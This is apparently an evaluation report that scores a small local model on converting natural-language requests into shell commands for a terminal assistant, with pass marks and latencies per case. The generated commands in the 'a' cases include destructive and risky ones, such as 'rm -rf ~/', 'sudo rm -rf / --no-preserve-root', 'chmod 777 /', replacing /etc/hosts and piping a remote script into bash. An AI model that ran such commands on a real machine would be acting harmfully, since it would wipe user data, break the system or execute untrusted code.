# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/Qwen2.5-Coder-1.5B-Instruct-Q4_K_M.gguf (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 57/72 (79%)
- cold p50 2212ms p95 3869ms · warm p50 2038ms p95 3583ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 1732 | 2408 | node -v ; npm -v |
| u02 | ✓ | 1812 | 1627 | ls -lh |
| u03 | ✓ | 1780 | 1768 | curl ifconfig.me |
| u04 | ✓ | 2648 | 2514 | lsof -i :3000 |
| u05 | ✓ | 2493 | 3447 | du -sh . |
| u06 | ✓ | 2741 | 2515 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -name '*.log'  |
| u07 | ✓ | 2077 | 2142 | ps aux | grep node |
| u08 | ✓ | 2483 | 2428 | git status ; git branch |
| u09 | ✓ | 1850 | 1878 | brew install ripgrep |
| u10 | ✓ | 2611 | 2400 | mkdir projects ; cd projects |
| u11 | ✓ | 2290 | 2199 | tar -czvf archive.tar.gz /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u12 | ✓ | 1773 | 1548 | echo $PATH |
| u13 | ✗ | 1878 | 1761 | killall -9 python3 |
| u14 | ✓ | 2164 | 1817 | tail -n 20 /var/log/syslog |
| u15 | ✗ | 1678 | 1835 | brew list python3 |
| u16 | ✓ | 2230 | 2135 | brew update ; brew outdated |
| u17 | ✓ | 2306 | 2160 | echo $SHELL ; echo $HOME |
| u18 | ✓ | 1870 | 1771 | git reset HEAD~1 |
| u19 | ✗ | 2087 | 1981 | ls -lh ~ | sort -rh | head -n 5 |
| u20 | ✗ | 2212 | 2008 | ps aux --sort=-%mem |
| u21 | ✓ | 1898 | 2243 | find . -name '*.js' -exec wc -l {} + |
| u22 | ✓ | 1757 | 1558 | brew services restart docker |
| u23 | ✓ | 2328 | 2306 | chmod +x script.sh ; ./script.sh |
| u24 | ✓ | 2293 | 2096 | grep -r 'TODO' /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u25 | ✓ | 2837 | 2762 | mkdir -p ~/Downloads ; curl -L https://example.com/file.zip -o ~/Downloads/file. |
| u26 | ✗ | 2578 | 4106 | lscpu ; nproc |
| u27 | ✓ | 2881 | 3883 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 3181 | 2079 | rm -rf node_modules |
| u29 | ✓ | 1735 | 1769 | lsof -i -P -n | grep LISTEN |
| u30 | ✓ | 2019 | 2132 | unzip file.zip |
| u31 | ✓ | 2248 | 2038 | tail -f /Users/hridyaagrawal/Honey/React/smartterminal/lexis/logs/error.log |
| u32 | ✓ | 1700 | 1622 | uptime |
| u33 | ✓ | 1920 | 1793 | ls -a ~/.zshrc ~/.zshenv ~/.zprofile |
| u34 | ✓ | 1607 | 1659 | cat /etc/resolv.conf |
| u35 | ✓ | 1854 | 1659 | cp file.txt backup.txt |
| u36 | ✓ | 1884 | 1694 | mv old.txt new.txt |
| u37 | ✓ | 1987 | 1971 | du -sh /Users/hridyaagrawal/Honey/React/smartterminal/lexis/downloads |
| u38 | ✓ | 1832 | 1780 | npm list -g |
| u39 | ✓ | 1661 | 1711 | open . |
| u40 | ✓ | 1738 | 1689 | sudo killall -HUP mDNSResponder |
| a01 | ✓ | 1736 | 1662 | rm -rf ~/ |
| a02 | ✓ | 2499 | 2511 | sudo rm -rf / ; sudo softwareupdate --install --all |
| a03 | ✓ | 1802 | 1693 | git push origin main --force |
| a04 | ✗ | 2231 | 2016 | brew install https://sketchy.example.com/install.sh |
| a05 | ✗ | 1757 | 1739 | killall -9 -v |
| a06 | ✓ | 2491 | 2452 | chmod 777 / |
| a07 | ✗ | 3655 | - | - |
| a08 | ✓ | 1909 | 2125 | brew install https://x.io/i |
| a09 | ✓ | 2283 | 1996 | sudo chown -R $USER:$USER / |
| a10 | ✓ | 2539 | 2181 | find /var/log -type f -mtime +30 -exec rm -f {} \; |
| a11 | ✗ | 3578 | - | - |
| a12 | ✓ | 1828 | 1863 | git reset --hard HEAD~1 |
| a13 | ✓ | 1933 | 1905 | brew uninstall node |
| a14 | ✗ | 3869 | - | - |
| a15 | ✓ | 2252 | 2415 | rm -rf /Users/hridyaagrawal/Honey/React/smartterminal/lexis/temp/* |
| a16 | ✓ | 3447 | 3583 | du -sh /Users/hridyaagrawal/Honey/React/smartterminal/lexis ; rm -rf /Users/hrid |
| a17 | ✗ | 2158 | 2187 | rm -rf ~/Honey/React/smartterminal/lexis |
| a18 | ✗ | 5467 | 3990 | openssl enc -aes-256-cbc -salt -in /Users/hridyaagrawal/Honey/React/smarttermina |
| a19 | ✓ | 4494 | 2728 | echo 'export PATH=$PATH:/path/to/new/directory' >> ~/.zshrc |
| a20 | ✓ | 2418 | 2210 | rm -rf / --no-preserve-root |
| u41 | ✗ | 2304 | 2333 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -size +100M |
| u42 | ✓ | 2590 | 2503 | touch my_notes.txt ; echo 'hello world' > my_notes.txt |
| u43 | ✓ | 1874 | 1816 | git log -5 |
| u44 | ✓ | 2334 | 2885 | curl -s https://example.com |
| u45 | ✓ | 2274 | 1959 | ls -l | grep ^- | wc -l |
| u46 | ✓ | 1945 | 1903 | ifconfig | grep 'inet ' | awk '{print $2}' |
| u47 | ✓ | 1980 | 1829 | df -h |
| u48 | ✓ | 1730 | 1793 | whoami |
| a21 | ✗ | 3911 | - | - |
| a22 | ✓ | 3197 | 3022 | rm /etc/hosts ; ln -s ~/Documents/hosts /etc/hosts |
| a23 | ✓ | 2046 | 1968 | rm -rf * |
| a24 | ✗ | 2249 | 2293 | curl https://x.io/i.sh | bash |
